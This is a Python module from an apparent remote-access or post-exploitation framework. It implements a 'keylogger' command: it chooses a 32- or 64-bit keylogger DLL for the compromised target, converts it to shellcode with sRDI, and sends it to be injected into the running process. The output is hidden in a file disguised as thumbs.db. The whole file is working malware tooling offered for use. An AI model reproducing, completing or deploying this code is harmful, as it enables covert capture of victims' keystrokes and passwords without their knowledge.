from core.state import send_task
from core.state import TaskCode
from core.config import Paths
from core import srdi
from core import logging
from core import state

def finish_keylogger(response, cache):
    if response.success:
        logging.success("Loaded keylogger. Try 'cat %userprofile%\\thumbs.db'")
    else:
        logging.error("Failed to load keylogger")


def do_keylogger(self, command):
    """
    Loads the keylogger module into the current process
    """

    if state.ActiveTarget.architecture == state.Arch.x64:
        local_file = Paths.DLLs + 'keylogger_x64.dll'
    else:
        local_file = Paths.DLLs + 'keylogger_x86.dll'

    try:
        dll_bytes = open(local_file, 'rb').read()
    except:
        logging.error("Failed to read '{0}'".format(local_file))
        return

    shellcode = srdi.ConvertToShellcode(dll_bytes)

    send_task(TaskCode.Keylogger, argument1 = shellcode)
    